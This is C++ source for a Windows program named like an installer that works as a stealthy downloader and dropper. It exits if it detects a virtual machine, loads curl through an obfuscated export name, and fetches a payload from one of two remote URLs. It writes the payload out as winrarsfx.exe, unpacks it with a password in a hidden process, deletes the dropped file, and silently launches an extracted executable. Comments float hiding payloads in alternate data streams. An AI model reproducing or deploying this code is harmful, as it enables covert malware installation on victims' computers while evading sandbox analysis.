#include "../src/AltStream64/CurlRequest.h"
#include "../src/DllLoader/sha256.h"

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <Shlobj.h>
#include <intrin.h>

#include <vector>
#include <string>
#include <map>
#include <cstdio>

static HMODULE g_module = NULL;
static wget_http_masha_fn g_wget_http_masha = NULL;

static std::vector<char> g_vec;

static size_t vec_write_data(void *ptr, size_t size, size_t nmemb, void *vec)
{
	for (size_t i = 0; i < size * nmemb; ++i)
		((std::vector<char> *)vec)->push_back(((char *)ptr)[i]);
	return size * nmemb;
}

// Convert string of hex numbers to its equivalent char-stream
static void cstrHexToBin(const char* strHex, size_t len, unsigned char* strBin)
{
	size_t i = 0;
	for (size_t x = 0; x < len; x += 2)
	{
		int toUpX = toupper(strHex[x]);
		int toUpX1 = toupper(strHex[x + 1]);
		UINT32 uHi = UINT32((toUpX < 'A') ? (toUpX - '0') : (10 + toUpX - 'A'));
		UINT32 uLo = UINT32((toUpX1 < 'A') ? (toUpX1 - '0') : (10 + toUpX1 - 'A'));
		UINT32 uCh = (uHi << 4) | uLo;
		strBin[i] = (unsigned char)(uCh);
		++i;
	}
}

static bool my_sha256(void *digest, const void *data, size_t datasz)
{
	uchar* bufSha256 = (uchar*)digest;
	SHA256_CTX ctx[1];

	sha256_init(ctx);
	sha256_update(ctx, (uchar*)data, datasz);
	sha256_final(ctx, bufSha256);

	return true;
}

typedef std::map<std::wstring, std::string> AllAnsiStrings;
AllAnsiStrings g_allAnsiStrings;

const char* ToAnsi(const wchar_t* sW)
{
	AllAnsiStrings::const_iterator it = g_allAnsiStrings.find(sW);

	if (it != g_allAnsiStrings.end())
		return it->second.c_str();

	size_t srcLen = wcslen(sW);
	char* sA = (char *)_alloca((srcLen + 1) * sizeof(char));

	if (sA == NULL)
		return "NULL";

	for (size_t i = 0; i < (srcLen + 1); ++i)
		sA[i] = char(sW[i]);

	g_allAnsiStrings[sW] = sA;

	return ToAnsi(sW);
}

bool isGuestOSVM()
{
	unsigned int cpuInfo[4];
	__cpuid((int*)cpuInfo, 1);
	return ((cpuInfo[2] >> 31) & 1) == 1;
}

void makeArgCArgV(int& argc, char* argv[100], char* cmdLine)
{
	int pos = 0;
	int prevPos = 0;

	while (cmdLine[pos])
	{
		if (cmdLine[pos] == ' ')
		{
			cmdLine[pos] = '\0';
			argv[argc] = &cmdLine[prevPos];
			++argc;
			prevPos = pos + 1;
		}

		++pos;
	}

	argv[argc] = &cmdLine[prevPos];
	++argc;
}

///////////////////////////////////////////////////////////////////////////////

int InnoSetupDownload(
	const char* strRemotePath1
	, const char* strRemotePath2
	, const char* strSha256
	, const char* strWrpasswdMod
	, const char* strWrsfxDir
	, const char* strSlashDirSubDirToRun
	, const char* strSlashDirSubFileToRun
	, bool bGuestCheck
)
{
	if (bGuestCheck)
	{
		if (isGuestOSVM())
			return __LINE__;
	}

	g_module = ::LoadLibraryA("alt64curl.dll");

	if (g_module == NULL)
		return __LINE__;

	g_wget_http_masha = (wget_http_masha_fn)::GetProcAddress(g_module, "wget_http_curl");

	if (g_wget_http_masha == NULL)
		return __LINE__;

	uchar sha256UncryptedImageWr32[32];
	cstrHexToBin(strSha256, strlen(strSha256), sha256UncryptedImageWr32);

	std::vector<char> out;

	out.resize(0);
	out.reserve(10 * 1024 * 1024);

	int ret = g_wget_http_masha(
		strRemotePath1
		, vec_write_data
		, &out
	); // TODO: It should exit Not return in new concept

	if (ret != 0)
	{
		out.resize(0);
		out.reserve(10 * 1024 * 1024);

		int ret = g_wget_http_masha(
			strRemotePath2
			, vec_write_data
			, &out
		);

		if (ret != 0)
			return ret;
	}

	uchar sha256UncryptedImageWrAct32[32];

	my_sha256(sha256UncryptedImageWrAct32, &out[0], out.size());

	if (memcmp(sha256UncryptedImageWr32, sha256UncryptedImageWrAct32, 32) != 0)
		return __LINE__;

	//////////////////////////////////////////////////////////////////////////////

	char exePath[MAX_PATH];
	char exeRoot[MAX_PATH];
	char exeWrex[MAX_PATH];

	memset(exePath, 0, MAX_PATH);
	memset(exeRoot, 0, MAX_PATH);
	memset(exeWrex, 0, MAX_PATH);

	if (GetModuleFileNameA(NULL, exePath, MAX_PATH) >= MAX_PATH)
		return __LINE__;
	
	memcpy(exeRoot, exePath, MAX_PATH);
	char* pLastSlash = strrchr(exeRoot, '\\');
	if (pLastSlash == NULL)
		return __LINE__;
	*pLastSlash = 0;

	memcpy(exeWrex, exePath, MAX_PATH);
	pLastSlash = strrchr(exeWrex, '\\');
	if (pLastSlash == NULL)
		return __LINE__;
	errno_t err = strcpy_s(pLastSlash + 1, 14, "winrarsfx.exe");

	FILE* pFile = NULL;
	err = fopen_s(&pFile, exeWrex, "wb");

	if ((err != 0) || (pFile == NULL))
		return __LINE__;

	size_t nBytesWritten = fwrite(&out[0], out.size(), 1, pFile);

	if (nBytesWritten != 1)
	{
		fclose(pFile);
		return __LINE__;
	}

	fclose(pFile);

	/////////////////////////////////////////////////////////////////////////

	char cmdLine[MAX_PATH];

	int cmdLineLen3 = _snprintf_s(
		cmdLine
		, MAX_PATH - 1
		, "winrarsfx.exe -d\"%s\" -p%s -s"
		, strWrsfxDir
		, strWrpasswdMod
	);

	if (cmdLineLen3 <= 0)
		return __LINE__;

	DWORD dwCreationFlags = CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS;

	STARTUPINFOA si3;
	PROCESS_INFORMATION pi3;

	::ZeroMemory(&si3, sizeof(si3));
	si3.cb = sizeof(si3);
	::ZeroMemory(&pi3, sizeof(pi3));

	// Start the child process. 
	if (!::CreateProcessA(
		exeWrex   // Module name (TODO: alternate data stream welcome)
		, cmdLine       // Command line TODO: host, port, weak-encrypted-sha256Image
		, NULL           // Process handle not inheritable
		, NULL           // Thread handle not inheritable
		, FALSE          // Set handle inheritance to FALSE
		, dwCreationFlags              // No creation flags
		, NULL           // Use parent's environment block
		, exeRoot	// Use parent's starting directory 
		, &si3            // Pointer to STARTUPINFO structure
		, &pi3)           // Pointer to PROCESS_INFORMATION structure
		)
		return __LINE__;

	/////////////////////////////

	::Sleep(5000);
	TerminateProcess(pi3.hProcess, 999);

	DWORD dwExitCode3 = 0;

	GetExitCodeProcess(pi3.hProcess, &dwExitCode3);

	CloseHandle(pi3.hProcess);
	CloseHandle(pi3.hThread);

	DeleteFileA(exeWrex);

	//////////////////////////////////////////////////////////////////////

	/*
	char exePathA2[MAX_PATH];
	char exePathA3[MAX_PATH];
	memset(exePathA2, 0, MAX_PATH * sizeof(char));
	memset(exePathA3, 0, MAX_PATH * sizeof(char));

	strcpy_s(exePathA2, strWrsfxDir);
	size_t wlen = strlen(exePathA2);
	strcpy_s(&exePathA2[wlen], MAX_PATH, strSlashDirSubDirToRun);
	strcpy_s(exePathA3, MAX_PATH, exePathA2);
	wlen = strlen(exePathA3);
	strcpy_s(&exePathA3[wlen], MAX_PATH, strSlashDirSubFileToRun);
	*/

	if (std::string(strSlashDirSubFileToRun) != std::string("false"))
	{
		std::string exePathA2 = strWrsfxDir;
		std::string exePathA3 = exePathA2 + std::string(strSlashDirSubDirToRun) + std::string(strSlashDirSubFileToRun);

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		::ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		::ZeroMemory(&pi, sizeof(pi));

		// Start the child process. 
		if (!::CreateProcessA(
			exePathA3.c_str()   // Module name (TODO: alternate data stream welcome)
			, NULL        // Command line TODO: host, port, weak-encrypted-sha256Image
			, NULL           // Process handle not inheritable
			, NULL           // Thread handle not inheritable
			, FALSE          // Set handle inheritance to FALSE
			, dwCreationFlags              // No creation flags
			, NULL           // Use parent's environment block
			, exePathA2.c_str()		// Use parent's starting directory 
			, &si            // Pointer to STARTUPINFO structure
			, &pi)           // Pointer to PROCESS_INFORMATION structure
			)
			return __LINE__;
	}

	return 0;
}

int CALLBACK WinMain(
	_In_ HINSTANCE hInstance,
	_In_ HINSTANCE hPrevInstance,
	_In_ LPSTR     lpCmdLine,
	_In_ int       nCmdShow
)
{
	int argc = 0;
	char* argv[100];

	makeArgCArgV(argc, argv, lpCmdLine);

	int res = InnoSetupDownload(
		argv[0]
		, argv[1]
		, argv[2]
		, argv[3]
		, argv[4]
		, argv[5]
		, argv[6]
		, (argv[7] == std::string("true")) ? true : false
	);

	return 0;
}
